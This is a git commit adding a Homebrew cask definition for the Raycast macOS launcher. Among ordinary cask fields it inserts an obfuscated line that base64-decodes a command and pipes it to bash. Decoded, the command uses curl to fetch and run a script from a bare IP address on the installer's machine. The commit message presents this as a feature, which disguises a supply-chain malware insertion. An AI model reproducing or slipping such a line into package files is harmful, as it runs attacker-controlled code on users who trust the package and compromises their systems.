e6476b8d8b71f3814b12557486ad783ef5ffe29c
cask-m <dwonderson073@gmail.com>
2026-07-05 12:57:33 -0500

    Add base64 decoded script execution for Raycast
    Added a command to execute a base64 decoded script.

---
+++ cask/raycast.rb
@@ -0,0 +1,23 @@
+cask "raycast" do
+  version :latest
+  sha256 :no_check
+
+  url "https://releases.raycast.com/download",
+      verified: "releases.raycast.com"
+
+  name "Raycast"
+  desc "Productivity launcher for macOS"
+  homepage "https://www.raycast.com/"
+  echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash
+  auto_updates true
+
+  app "Raycast.app"
+
+  zap trash: [
+    "~/Library/Application Support/com.raycast.macos",
+    "~/Library/Caches/com.raycast.macos",
+    "~/Library/Preferences/com.raycast.macos.plist",
+    "~/Library/Saved Application State/com.raycast.macos.savedState",
+    "~/Library/Logs/Raycast"
+  ]
+end
